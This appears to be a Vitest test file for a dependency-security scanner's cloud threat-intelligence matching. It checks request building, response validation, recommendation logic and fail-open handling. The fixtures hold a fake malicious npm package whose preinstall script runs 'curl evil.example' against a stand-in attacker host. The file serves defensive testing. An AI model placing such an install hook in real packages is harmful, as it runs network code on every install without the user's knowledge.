import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { gzipSync } from 'node:zlib'
import { createHash } from 'node:crypto'
import { runIntelAnalysis } from '../../../src/scanner/intel/index'
import { scanPRFiles } from '../../../src/scanner/index'
import { verifyScanAttestation } from '../../../src/crypto/attestation'
import {
  matchCloud,
  buildMatchRequest,
  validateMatchResult,
  annotateFromMatch,
  MATCH_ENDPOINT,
} from '../../../src/scanner/intel/cloud-match'
import type { IntelMatchResult } from '../../../src/scanner/intel/cloud-match'
import type { TarballScanResult } from '../../../src/scanner/intel/deep-dependency'
import type { PRFile } from '../../../src/scanner/rules'
import { CONTENT_ID_PREFIX, sha512Hex } from '../../../src/scanner/intel/content-intel/identity'
import { resetContentIntelSingleton } from '../../../src/scanner/intel/content-intel/store'
import { setCloudMotorFull } from '../../../src/scanner/intel/cloud-lookup'

const BASE = 'https://cloud.example'
const TOKEN = 'sntl_test_pat_123'

function jsonResponse(status: number, body: unknown): Response {
  return new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } })
}

/** Valid N3.3 match body factory (mirrors the CLI test helper). */
function matchBody(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    state: 'MALICIOUS',
    decisiveState: 'MALICIOUS',
    contentId: `sha512:${'a'.repeat(128)}`,
    revoked: false,
    contentIdLevel: {
      found: true,
      verified: true,
      usable: true,
      verdict: 'MALICIOUS',
      confidence: 0.9,
      signature: 'a'.repeat(64),
      reason: null,
      historyLength: 3,
    },
    identityLevel: {
      packageIdentity: 'npm/evildep@1.0.0',
      identityKnown: true,
      observations: 3,
      distinctContributors: 2,
      artifacts: 2,
      corroborated: true,
      corroboratedState: 'MALICIOUS',
      knownSignals: ['install_script'],
      maxRisk: 'critical',
      firstSeen: 1754035200000,
      hasCurrentArtifact: true,
    },
    match: {
      knownSignals: ['install_script'],
      newBehaviorSignals: [],
      sharedEvidence: {
        observations: 3,
        distinctContributors: 2,
        artifacts: 2,
        riskBand: 'critical',
        corroborated: true,
        decisiveState: 'MALICIOUS',
        firstSeen: 1754035200000,
      },
    },
    ...overrides,
  }
}

function matchResult(overrides: Record<string, unknown> = {}): IntelMatchResult {
  return matchBody(overrides) as unknown as IntelMatchResult
}

/** Minimal fresh scan (as returned by analyzeDependencyTarball). */
function fakeScan(overrides: Partial<TarballScanResult> = {}): TarballScanResult {
  return {
    resolvedVersion: '1.0.0',
    contentId: 'b'.repeat(128),
    integrityVerified: true,
    delta: {
      packageName: 'evildep',
      fromVersion: '',
      toVersion: '1.0.0',
      filesChanged: 2,
      newDomains: ['evil.example'],
      newNetworkCalls: 1,
      newDependencies: [],
      newCapabilities: ['Shell'],
      newScripts: ['package/setup.mjs'],
      newBinaries: [],
      risk: 'critical',
      summary: '2 files, 1 domains, 1 install scripts',
    },
    files: new Map([['package.json', JSON.stringify({ name: 'evildep', version: '1.0.0' })]]),
    lifecycleScripts: [{ script: 'preinstall', command: 'node setup.mjs', dangerous: true }],
    ...overrides,
  }
}

function createTarBuffer(files: { name: string; content: string }[]): Buffer {
  const blocks: Buffer[] = []
  for (const file of files) {
    const nameBuf = Buffer.alloc(100)
    nameBuf.write(file.name.slice(0, 99), 'utf-8')
    const sizeBuf = Buffer.from(file.content.length.toString(8).padStart(11, '0') + ' ', 'utf-8')
    const modeBuf = Buffer.from('0000644 ', 'utf-8')
    const uidBuf = Buffer.from('0000000 ', 'utf-8')
    const gidBuf = Buffer.from('0000000 ', 'utf-8')
    const mtimeBuf = Buffer.from('00000000000 ', 'utf-8')
    const typeFlag = Buffer.from([48])
    const linknameBuf = Buffer.alloc(100)
    const magicBuf = Buffer.from('ustar\0', 'utf-8')
    const versionBuf = Buffer.from('00', 'utf-8')
    const unameBuf = Buffer.alloc(32)
    const gnameBuf = Buffer.alloc(32)
    const devmajorBuf = Buffer.from('0000000 ', 'utf-8')
    const devminorBuf = Buffer.from('0000000 ', 'utf-8')
    const prefixBuf = Buffer.alloc(155)
    const paddingBuf = Buffer.alloc(12)
    const header = Buffer.concat([
      nameBuf, modeBuf, uidBuf, gidBuf, sizeBuf, mtimeBuf,
      Buffer.alloc(8), typeFlag, linknameBuf, magicBuf, versionBuf,
      unameBuf, gnameBuf, devmajorBuf, devminorBuf, prefixBuf, paddingBuf,
    ])
    let chksum = 0
    for (let i = 0; i < 512; i++) {
      if (i >= 148 && i < 156) chksum += 32
      else chksum += header[i]
    }
    header.write(chksum.toString(8).padStart(6, '0'), 148, 'utf-8')
    header[154] = 0x20
    header[155] = 0x20
    blocks.push(header)
    const contentBuf = Buffer.from(file.content, 'utf-8')
    blocks.push(contentBuf)
    const padLen = 512 - (contentBuf.length % 512)
    if (padLen < 512) blocks.push(Buffer.alloc(padLen))
  }
  blocks.push(Buffer.alloc(512))
  blocks.push(Buffer.alloc(512))
  return Buffer.concat(blocks)
}

function sriFor(buf: Buffer): string {
  return 'sha512-' + createHash('sha512').update(buf).digest('base64')
}

function depTarball(name: string, version: string): Buffer {
  const tar = createTarBuffer([
    { name: 'package/package.json', content: JSON.stringify({ name, version, scripts: { preinstall: 'curl evil.example' } }) },
  ])
  return gzipSync(tar)
}

function makeFiles(deps: Record<string, string>): PRFile[] {
  const depLines = Object.entries(deps).map(([name, version]) => `+    "${name}": "${version}",`).join('\n')
  return [
    {
      status: 'modified',
      filename: 'package.json',
      additions: 50,
      deletions: 0,
      patch: `+{\n+  "dependencies": {\n${depLines}\n+  }\n+}`,
      contents_url: '',
    },
    {
      status: 'added',
      filename: 'package-lock.json',
      additions: 50,
      deletions: 0,
      patch: JSON.stringify({ name: 'proj', version: '1.0.0', dependencies: deps }),
      contents_url: '',
    },
  ]
}

/** Combined stub: registry JSON/tarball + match + contribute endpoints. */
function setupCloudFetch(
  deps: Record<string, string>,
  matchHandler: (url: string, init: RequestInit | undefined) => Promise<Response> | Response,
): ReturnType<typeof vi.fn> {
  const registry: Record<string, { json: unknown; tarball: Buffer }> = {}
  for (const name of Object.keys(deps)) {
    const version = (deps[name] || '').replace(/[\^~><=]/g, '')
    const tar = depTarball(name, version)
    registry[`registry.npmjs.org/${name}`] = {
      json: { versions: { [version]: { name, version, dist: { integrity: sriFor(tar) } } } },
      tarball: tar,
    }
  }
  const mock = vi.fn(async (input: unknown, init?: RequestInit) => {
    const url = String(input)
    if (url.includes(MATCH_ENDPOINT)) return matchHandler(url, init)
    if (url.includes('/api/intelligence/contribute')) {
      return jsonResponse(200, { applied: true, contentId: `sha512:${'c'.repeat(128)}`, state: 'MALICIOUS', previousState: 'UNKNOWN', reason: null, scannerVersion: '1.0.2', verified: false })
    }
    for (const key of Object.keys(registry)) {
      if (url.includes(key)) {
        const entry = registry[key]
        if (url.endsWith('.tgz')) return new Response(entry.tarball as BodyInit, { status: 200, headers: { 'content-type': 'application/octet-stream', 'content-length': String(entry.tarball.length) } })
        return jsonResponse(200, entry.json)
      }
    }
    throw new TypeError(`ENOTFOUND ${url}`)
  })
  vi.stubGlobal('fetch', mock)
  return mock
}

function matchByDepName(handlers: Record<string, unknown>): (url: string, init: RequestInit | undefined) => Response {
  return (_url: string, init: RequestInit | undefined) => {
    const body = JSON.parse(String(init?.body)) as { identity?: { package?: string } }
    const pkg = body.identity?.package ?? 'unknown'
    return jsonResponse(200, handlers[pkg] ?? matchBody())
  }
}

beforeEach(() => {
  resetContentIntelSingleton()
  vi.stubEnv('SENTINEL_CLOUD_URL', BASE)
  vi.stubEnv('SENTINEL_CLOUD_API_TOKEN', TOKEN)
  vi.stubEnv('SENTINEL_CONTENT_INTEL', '0')
  vi.stubEnv('SENTINEL_TARBALL_SCAN', '1')
})

afterEach(() => {
  vi.unstubAllEnvs()
  vi.unstubAllGlobals()
})

describe('cloud-match buildMatchRequest (contentId = manifest sha512, packageHash = tarball sha512)', () => {
  it('builds a de-identified request with the right identity fields', () => {
    const scan = fakeScan()
    const req = buildMatchRequest(scan, [])
    expect(req).not.toBeNull()
    expect(req!.contentId).toBe(`${CONTENT_ID_PREFIX}${sha512Hex(Buffer.from(scan.files.get('package.json')!, 'utf8'))}`)
    expect(req!.identity).toEqual({
      ecosystem: 'npm',
      package: 'evildep',
      version: '1.0.0',
      packageHash: 'b'.repeat(128),
    })
    expect(req!.signals).toBeDefined()
    expect(req!.scannerVersion.length).toBeGreaterThan(0)
  })

  it('returns null when the tarball has no manifest', () => {
    expect(buildMatchRequest(fakeScan({ files: new Map() }), [])).toBeNull()
  })

  it('omits identity when the manifest is not parseable', () => {
    const req = buildMatchRequest(fakeScan({ files: new Map([['package.json', 'not-json']]) }), [])
    expect(req).not.toBeNull()
    expect(req!.identity).toBeUndefined()
  })
})

describe('cloud-match validateMatchResult (strict N3.3 contract)', () => {
  it('accepts a fully valid response', () => {
    expect(validateMatchResult(matchResult())).not.toBeNull()
  })

  it('rejects unknown state / decisiveState', () => {
    expect(validateMatchResult(matchResult({ state: 'PASS' }))).toBeNull()
    expect(validateMatchResult(matchResult({ decisiveState: 'SAFE' }))).toBeNull()
  })

  it('rejects malformed signature, bad contentId and non-boolean hasCurrentArtifact', () => {
    expect(validateMatchResult(matchResult({ contentId: 'sha512:short' }))).toBeNull()
    expect(validateMatchResult(matchResult({ contentIdLevel: { ...matchResult().contentIdLevel, signature: 'abc' } }))).toBeNull()
    expect(validateMatchResult(matchResult({ identityLevel: { ...matchResult().identityLevel, hasCurrentArtifact: 'yes' } }))).toBeNull()
  })
})

describe('cloud-match matchCloud HTTP contract (fail-open)', () => {
  it('does not call fetch when the cloud is not configured', async () => {
    vi.stubEnv('SENTINEL_CLOUD_URL', '')
    vi.stubEnv('SENTINEL_CLOUD_API_TOKEN', '')
    const mock = vi.fn()
    vi.stubGlobal('fetch', mock)
    const outcome = await matchCloud(fakeScan(), [], { baseUrl: undefined, token: undefined })
    expect(outcome.kind).toBe('error')
    expect(mock).not.toHaveBeenCalled()
  })

  it('posts to the match endpoint with the de-identified body and Bearer token', async () => {
    const mock = vi.fn(async () => jsonResponse(200, matchBody()))
    vi.stubGlobal('fetch', mock)
    const outcome = await matchCloud(fakeScan(), [], { baseUrl: BASE, token: TOKEN })
    expect(outcome.kind).toBe('match')
    const [url, init] = mock.mock.calls[0] as [string, RequestInit]
    expect(url).toBe(`${BASE}${MATCH_ENDPOINT}`)
    expect((init.headers as Record<string, string>).authorization).toBe(`Bearer ${TOKEN}`)
    expect((init.headers as Record<string, string>)['content-type']).toBe('application/json')
    const body = JSON.parse(String(init.body))
    expect(body).not.toHaveProperty('repoKey')
    expect(body).not.toHaveProperty('path')
    expect(body).not.toHaveProperty('repo')
    expect(body).not.toHaveProperty('pr')
    expect(body.contentId).toMatch(/^sha512:[0-9a-f]{128}$/)
    expect(body.identity.packageHash).toMatch(/^[0-9a-f]{128}$/)
  })

  it('collapses 401/403/429/500/503 into error (never a match)', async () => {
    for (const status of [401, 403, 429, 500, 503]) {
      vi.stubGlobal('fetch', vi.fn(async () => jsonResponse(status, {})))
      const outcome = await matchCloud(fakeScan(), [], { baseUrl: BASE, token: TOKEN })
      expect(outcome.kind).toBe('error')
    }
  })

  it('collapses network failure into error without throwing', async () => {
    vi.stubGlobal('fetch', vi.fn(async () => { throw new TypeError('ENOTFOUND') }))
    const outcome = await matchCloud(fakeScan(), [], { baseUrl: BASE, token: TOKEN })
    expect(outcome.kind).toBe('error')
  })

  it('collapses malformed 200 responses into error', async () => {
    vi.stubGlobal('fetch', vi.fn(async () => jsonResponse(200, { state: 'NOPE' })))
    const outcome = await matchCloud(fakeScan(), [], { baseUrl: BASE, token: TOKEN })
    expect(outcome.kind).toBe('error')
  })

  it('aborts the request when the timeout elapses and returns error', async () => {
    let capturedSignal: AbortSignal | undefined
    vi.stubGlobal('fetch', vi.fn(async (_url: string, init?: RequestInit) => {
      capturedSignal = init?.signal
      return new Promise<Response>((_resolve, reject) => {
        init?.signal?.addEventListener('abort', () => reject(new DOMException('The operation was aborted.', 'AbortError')))
      })
    }))
    const started = Date.now()
    const outcome = await matchCloud(fakeScan(), [], { baseUrl: BASE, token: TOKEN, timeoutMs: 25 })
    expect(Date.now() - started).toBeLessThan(2000)
    expect(outcome.kind).toBe('error')
    expect(capturedSignal?.aborted).toBe(true)
  })
})

describe('cloud-match annotateFromMatch (N3.3 §5 read-only semantics)', () => {
  it('BLOCK fast-path only for MALICIOUS + verified + usable + same artifact + signature', () => {
    const ann = annotateFromMatch(matchResult(), fakeScan())
    expect(ann.recommendation).toBe('BLOCK')
    expect(ann.name).toBe('evildep')
    expect(ann.state).toBe('MALICIOUS')
  })

  it('VERIFY (never BLOCK) when the artifact is NOT the current one', () => {
    const ann = annotateFromMatch(matchResult({ identityLevel: { ...matchResult().identityLevel, hasCurrentArtifact: false } }), fakeScan())
    expect(ann.recommendation).toBe('VERIFY')
  })

  it('VERIFY (never BLOCK) when the record is unusable or unverified', () => {
    expect(annotateFromMatch(matchResult({ contentIdLevel: { ...matchResult().contentIdLevel, usable: false } }), fakeScan()).recommendation).toBe('VERIFY')
    expect(annotateFromMatch(matchResult({ contentIdLevel: { ...matchResult().contentIdLevel, verified: false } }), fakeScan()).recommendation).toBe('VERIFY')
  })

  it('CONTEXT for CORROBORATED even when decisiveState is MALICIOUS (never equates)', () => {
    const ann = annotateFromMatch(matchResult({ state: 'CORROBORATED', decisiveState: 'MALICIOUS' }), fakeScan())
    expect(ann.recommendation).toBe('CONTEXT')
  })

  it('CONTEXT for OBSERVED', () => {
    const ann = annotateFromMatch(matchResult({ state: 'OBSERVED', decisiveState: null }), fakeScan())
    expect(ann.recommendation).toBe('CONTEXT')
  })

  it('none for NO_MATCH (never implies SAFE)', () => {
    const ann = annotateFromMatch(matchResult({ state: 'NO_MATCH', decisiveState: null }), fakeScan())
    expect(ann.recommendation).toBe('none')
    expect(ann.state).toBe('NO_MATCH')
  })

  it('none for revoked content, never BLOCK', () => {
    const ann = annotateFromMatch(matchResult({ revoked: true }), fakeScan())
    expect(ann.recommendation).toBe('none')
  })
})

describe('N3.3D matrix (runIntelAnalysis fuses read-only annotations)', () => {
  // The cloud intel during scans is gated behind the explicit Motor Full flag
  // (see src/scanner/intel/cloud-lookup.ts). These matrix tests exercise the
  // fused flow, so they opt in exactly like operator does when enabling it.
  beforeEach(() => {
    setCloudMotorFull(true)
  })
  afterEach(() => {
    setCloudMotorFull(false)
  })

  it('fast cloud: MALICIOUS same artifact fuses BLOCK into the report', async () => {
    const mock = setupCloudFetch({ evildep: '^1.0.0' }, matchByDepName({ evildep: matchBody() }))
    const report = await runIntelAnalysis(makeFiles({ evildep: '^1.0.0' }), { contentIntelStore: null })
    expect(report.dependencyMatchIntel).toHaveLength(1)
    expect(report.dependencyMatchIntel![0]).toMatchObject({ name: 'evildep', state: 'MALICIOUS', recommendation: 'BLOCK' })
    const matchCalls = mock.mock.calls.filter(([u]) => String(u).includes(MATCH_ENDPOINT))
    expect(matchCalls).toHaveLength(1)
  })

  it('slow cloud: timeout produces no annotation, local analysis unchanged', async () => {
    setupCloudFetch({ evildep: '^1.0.0' }, (_url, init) => new Promise<Response>((_resolve, reject) => {
      init?.signal?.addEventListener('abort', () => reject(new DOMException('The operation was aborted.', 'AbortError')))
    }))
    const report = await runIntelAnalysis(makeFiles({ evildep: '^1.0.0' }), { contentIntelStore: null })
    expect(report.dependencyMatchIntel).toBeUndefined()
    expect(report.dependencyTarballFindings).toBeDefined()
  })

  it('down cloud (500): no annotation, no exception, local analysis intact', async () => {
    setupCloudFetch({ evildep: '^1.0.0' }, () => jsonResponse(500, {}))
    const report = await runIntelAnalysis(makeFiles({ evildep: '^1.0.0' }), { contentIntelStore: null })
    expect(report.dependencyMatchIntel).toBeUndefined()
    expect(report.dependencyTarballFindings).toBeDefined()
  })

  it('MALICIOUS different artifact: VERIFY, never BLOCK on identity alone', async () => {
    setupCloudFetch({ evildep: '^1.0.0' }, matchByDepName({ evildep: matchBody({ identityLevel: { ...matchBody().identityLevel, hasCurrentArtifact: false } }) }))
    const report = await runIntelAnalysis(makeFiles({ evildep: '^1.0.0' }), { contentIntelStore: null })
    expect(report.dependencyMatchIntel![0].recommendation).toBe('VERIFY')
  })

  it('CORROBORATED with decisiveState MALICIOUS stays CONTEXT, never BLOCK', async () => {
    setupCloudFetch({ evildep: '^1.0.0' }, matchByDepName({ evildep: matchBody({ state: 'CORROBORATED', decisiveState: 'MALICIOUS' }) }))
    const report = await runIntelAnalysis(makeFiles({ evildep: '^1.0.0' }), { contentIntelStore: null })
    expect(report.dependencyMatchIntel![0].state).toBe('CORROBORATED')
    expect(report.dependencyMatchIntel![0].recommendation).toBe('CONTEXT')
  })

  it('NO_MATCH: annotation present with recommendation none, never SAFE', async () => {
    setupCloudFetch({ evildep: '^1.0.0' }, matchByDepName({ evildep: matchBody({ state: 'NO_MATCH', decisiveState: null }) }))
    const report = await runIntelAnalysis(makeFiles({ evildep: '^1.0.0' }), { contentIntelStore: null })
    expect(report.dependencyMatchIntel![0].state).toBe('NO_MATCH')
    expect(report.dependencyMatchIntel![0].recommendation).toBe('none')
  })

  it('parallel: every dependency gets its own annotation', async () => {
    setupCloudFetch({ 'dep-a': '^1.0.0', 'dep-b': '^1.0.0' }, matchByDepName({
      'dep-a': matchBody({ state: 'OBSERVED', decisiveState: null }),
      'dep-b': matchBody(),
    }))
    const report = await runIntelAnalysis(makeFiles({ 'dep-a': '^1.0.0', 'dep-b': '^1.0.0' }), { contentIntelStore: null })
    const byName = Object.fromEntries((report.dependencyMatchIntel ?? []).map(a => [a.name, a.state]))
    expect(byName).toEqual({ 'dep-a': 'OBSERVED', 'dep-b': 'MALICIOUS' })
  })

  it('partial: one match fails, the other is still fused, no throw', async () => {
    setupCloudFetch({ 'dep-a': '^1.0.0', 'dep-b': '^1.0.0' }, (_url, init) => {
      const body = JSON.parse(String(init?.body)) as { identity?: { package?: string } }
      if (body.identity?.package === 'dep-b') return jsonResponse(503, {})
      return jsonResponse(200, matchBody({ state: 'OBSERVED', decisiveState: null }))
    })
    const report = await runIntelAnalysis(makeFiles({ 'dep-a': '^1.0.0', 'dep-b': '^1.0.0' }), { contentIntelStore: null })
    expect((report.dependencyMatchIntel ?? []).map(a => a.name)).toEqual(['dep-a'])
  })

  it('scoring/verdict inputs are byte-identical with a BLOCK match vs a down cloud', async () => {
    setupCloudFetch({ evildep: '^1.0.0' }, () => jsonResponse(200, matchBody()))
    const withMatch = await runIntelAnalysis(makeFiles({ evildep: '^1.0.0' }), { contentIntelStore: null })
    setupCloudFetch({ evildep: '^1.0.0' }, () => jsonResponse(503, {}))
    const down = await runIntelAnalysis(makeFiles({ evildep: '^1.0.0' }), { contentIntelStore: null })
    expect(down.dependencyMatchIntel).toBeUndefined()
    expect(JSON.stringify(withMatch.securityDelta)).toBe(JSON.stringify(down.securityDelta))
    expect(JSON.stringify(withMatch.dependencyTarballFindings)).toBe(JSON.stringify(down.dependencyTarballFindings))
    expect(JSON.stringify(withMatch.dependencyDelta)).toBe(JSON.stringify(down.dependencyDelta))
  })

  it('attestation still verifies and scoring is untouched when a match fires', async () => {
    setupCloudFetch({ evildep: '^1.0.0' }, () => jsonResponse(200, matchBody()))
    const withMatch = await scanPRFiles(makeFiles({ evildep: '^1.0.0' }), 42, 'owner', 'repo', 'sha', 'scanhash')
    setupCloudFetch({ evildep: '^1.0.0' }, () => jsonResponse(503, {}))
    const down = await scanPRFiles(makeFiles({ evildep: '^1.0.0' }), 42, 'owner', 'repo', 'sha', 'scanhash')
    expect(withMatch.riskScore).toBe(down.riskScore)
    expect(withMatch.state).toBe(down.state)
    expect(verifyScanAttestation(withMatch.attestation).valid).toBe(true)
  })
})
